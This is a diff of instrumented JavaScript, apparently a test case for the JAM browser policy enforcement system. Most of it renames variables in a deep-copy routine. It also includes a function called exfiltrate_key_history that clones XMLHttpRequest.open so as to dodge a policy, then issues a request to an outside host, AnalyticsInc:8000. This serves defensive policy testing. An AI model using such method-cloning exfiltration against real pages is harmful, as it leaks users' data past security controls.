@@ -7,34 +7,30 @@ function copy(obj$$16) {
     if (obj$$16 != value$$27) {
       return JAM.new(obj$$16.constructor, [value$$27]);
     } else {
-      var v13 = obj$$16 instanceof obj$$16.constructor;
-      if (v13) {
-        v13 = obj$$16.constructor !== Object;
+      var v11 = obj$$16 instanceof obj$$16.constructor;
+      if (v11) {
+        v11 = obj$$16.constructor !== Object;
       }
-      if (v13) {
+      if (v11) {
         var c = clone(obj$$16.constructor.prototype);
         var property;
         for (property in obj$$16) {
           if (obj$$16.hasOwnProperty(property)) {
-            var v2 = c;
-            var v3 = property;
             introspect(JAM.policy.p1) {
-              var v15 = obj$$16[property]
+              var v2 = obj$$16[property]
             }
-            var v20 = copy(v15);
-            JAM.set(v2, v3, v20);
+            var v16 = copy(v2);
+            JAM.set(c, property, v16);
           }
         }
       } else {
         c = {};
         for (property in obj$$16) {
-          var v5 = c;
-          var v6 = property;
           introspect(JAM.policy.p1) {
-            var v16 = obj$$16[property]
+            var v4 = obj$$16[property]
           }
-          var v21 = copy(v16);
-          JAM.set(v5, v6, v21);
+          var v17 = copy(v4);
+          JAM.set(c, property, v17);
         }
       }
       return c;
@@ -51,12 +47,12 @@ function clone(obj$$17) {
 }
 function exfiltrate_key_history() {
   xmlhttp = new XMLHttpRequest;
-  var v10 = xmlhttp;
+  var v8 = xmlhttp;
   introspect(JAM.policy.p1) {
-    var v17 = xmlhttp.open
+    var v13 = xmlhttp.open
   }
-  var v22 = copy(v17);
-  v10.opennew = v22;
+  var v18 = copy(v13);
+  v8.opennew = v18;
   JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone5", true]);
   xmlhttp.send(null);
   return;
